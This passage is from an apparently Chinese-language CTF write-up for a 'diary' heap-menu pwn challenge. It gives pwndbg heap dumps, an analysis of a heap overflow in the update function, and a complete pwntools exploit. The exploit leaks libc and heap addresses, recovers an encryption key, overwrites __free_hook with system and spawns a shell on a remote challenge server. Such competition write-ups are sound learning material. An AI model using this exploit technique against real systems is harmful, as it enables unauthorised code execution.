<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1802</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1801</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1800</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1809</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1808</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;5&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1807</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;6&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1806</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;7&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1805</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;8&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1804</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;9&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>注意观察此时的堆风水：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555557f080</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555557f080</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555557f088</span> ◂— <span class="number">0x311</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555557f090</span> ◂— <span class="number">0x709550a0c0a1e1e</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55555557f098</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55555557f0a0</span> —▸ <span class="number">0x55555557fd00</span> ◂— <span class="number">0x3232323220202020</span> (<span class="string">&#x27;    2222&#x27;</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55555557f0a8</span> ◂— <span class="number">0x708550a0c0a1e1e</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55555557f0b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55555557f0b8</span> —▸ <span class="number">0x555555581730</span> —▸ <span class="number">0x7ffff7da9be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555582db0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55555557f0c0</span> ◂— <span class="number">0x708550a0c0a1e1e</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55555557f0c8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x55555557f0d0</span> —▸ <span class="number">0x555555581730</span> —▸ <span class="number">0x7ffff7da9be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555582db0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x55555557f0d8</span> ◂— <span class="number">0x711550a0c0a1e1e</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x55555557f0e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x55555557f0e8</span> —▸ <span class="number">0x555555581a70</span> —▸ <span class="number">0x555555581db0</span> —▸ <span class="number">0x5555555820f0</span> —▸ <span class="number">0x555555582430</span> ◂— ...</span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x55555557f0f0</span> ◂— <span class="number">0x710550a0c0a1e1e</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x55555557f0f8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>chunk1 和 chunk2 都是 unsortedbin</li>
<li>也就是说，接下来程序在这个 unsortedbin 中申请的第一个 chunk 会被当做 chunkn，可以被“堆菜单”提供的各个函数控制</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(*(<span class="keyword">void</span> **)(a1 + <span class="number">16</span>), <span class="number">0</span>, <span class="number">0x300</span>uLL);</span><br><span class="line"><span class="built_in">memcpy</span>(*(<span class="keyword">void</span> **)(a1 + <span class="number">16</span>), <span class="string">&quot;    &quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">len2 = <span class="number">0x2F0</span>;</span><br><span class="line"><span class="keyword">if</span> ( len &lt;= <span class="number">0x2F0</span> )</span><br><span class="line">  len2 = len;</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(*(_QWORD *)(a1 + <span class="number">16</span>) + <span class="number">4LL</span>), a2, len2);</span><br></pre></td></tr></table></figure>
<ul>
<li>在“堆菜单”的 <code>update</code> 函数中，可以对 0x2F0 字节大小的空间进行控制</li>
<li>只要申请的 chunk 比 0x2F0 小，就可以完成堆溢出</li>
</ul>
<p>接下来的思路很简单，就是利用这个堆溢出来修改 <code>encrypt</code> 创建的 chunk：</p>
<ul>
<li><code>encrypt</code> 会对程序进行加密，然后把原来的数据存储在一个 chunk 中</li>
<li>只要覆盖了这个 chunk 中的数据，就可以在 <code>decrypt</code> 中把修改后的数据写回</li>
<li>于是我们直接 <code>encrypt</code> tcachebin 上的 chunk，把 <code>encrypt</code> chunk 修改为 <code>free_hook</code> 后使用 <code>decrypt</code> 放回</li>
</ul>
<p>这里的堆风水是比较困难的，因为 <code>memset</code> 会把 heap 上相当一部分的数据置空，导致程序出现段错误，因此在进行溢出的 chunk 后面就只能有 <code>encrypt</code> chunk</p>
<p>但在实际操作中又会遇到一些问题，溢出的字节数不够，只能在 <code>encrypt</code> chunk 上覆盖 <code>free_hook</code> 的前4字节，不能将完整的 <code>free_hook</code> 写入（不知道出题人设计好的）</p>
<p>这里我卡了很久，之后突然想到可以直接使用 <code>update</code> 来覆盖后4字节的值（程序会在 chunk 之前加上4个空格），然后就可以申请到 <code>free_hook</code> 了</p>
<p>最后记得在 “/bin/sh” 两端加上 “;” 进行间隔</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./diary&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x3e66)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your test cmd:\n&quot;</span>,<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">year, month, day, hour, minutes, second, content</span>):</span></span><br><span class="line">    cmd(<span class="string">b&#x27;add#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(year),encoding=<span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(month),encoding=<span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(day),encoding=<span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(hour),encoding=<span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(minutes),encoding = <span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(second),encoding = <span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    cmd(<span class="string">b&#x27;update#&#x27;</span>+ <span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding = <span class="string">&quot;utf8&quot;</span>)+<span class="string">b&#x27;#&#x27;</span>+content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;show#&#x27;</span>+<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;delete#&#x27;</span>+<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">idx, offset, length</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;encrypt#&#x27;</span>+<span class="built_in">str</span>(idx)+<span class="string">&#x27;#&#x27;</span>+<span class="built_in">str</span>(offset)+<span class="string">&#x27;#&#x27;</span>+<span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;decrypt#&#x27;</span>+<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">2022</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2021</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2020</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2019</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2018</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;5&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2017</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;6&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2016</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;7&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x14390</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1802</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1801</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1800</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1809</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1808</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;5&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1807</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;6&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1806</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;7&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1805</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;8&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1804</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;9&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>] + libc_base</span><br><span class="line">system_libc = libc.sym[<span class="string">&quot;system&quot;</span>] + libc_base</span><br><span class="line">one_gadgets = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">2</span>] + libc_base</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">encrypt(<span class="number">0</span>,<span class="number">4</span>,<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;    &quot;</span>)</span><br><span class="line">leak_data = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line">success(<span class="string">&quot;leak_data &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_data))</span><br><span class="line">random_key = leak_data ^ <span class="number">0x3232323232323232</span></span><br><span class="line">success(<span class="string">&quot;random_key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(random_key))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1701</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1702</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1703</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1704</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1705</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;5&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1706</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;6&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1707</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;7&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1708</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;8&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1709</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;9&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1710</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;0&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = <span class="number">0x14770</span> + heap_base</span><br><span class="line">add(<span class="number">1711</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x2c0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">encrypt(<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free_hook_up = u32(p64(free_hook-<span class="number">4</span>-<span class="number">8</span>)[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">free_hook_down = u32(p64(free_hook-<span class="number">4</span>-<span class="number">8</span>)[:<span class="number">4</span>])</span><br><span class="line">success(<span class="string">&quot;free_hook_up &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook_up))</span><br><span class="line">success(<span class="string">&quot;free_hook_down &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook_down))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&quot;c&quot;</span>*(<span class="number">0x2f0</span>-<span class="number">4</span>)+p64(free_hook_down))</span><br><span class="line">edit(<span class="number">2</span>,p32(free_hook_up))</span><br><span class="line">decrypt(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1712</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">4</span>+p64(heap_base))</span><br><span class="line">add(<span class="number">1713</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;;/bin/sh&quot;</span>+p64(system_libc))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1713</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;;/bin/sh;&quot;</span>+p64(system_libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ez-atm"><a href="#ez-atm" class="headerlink" title="ez_atm"></a>ez_atm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
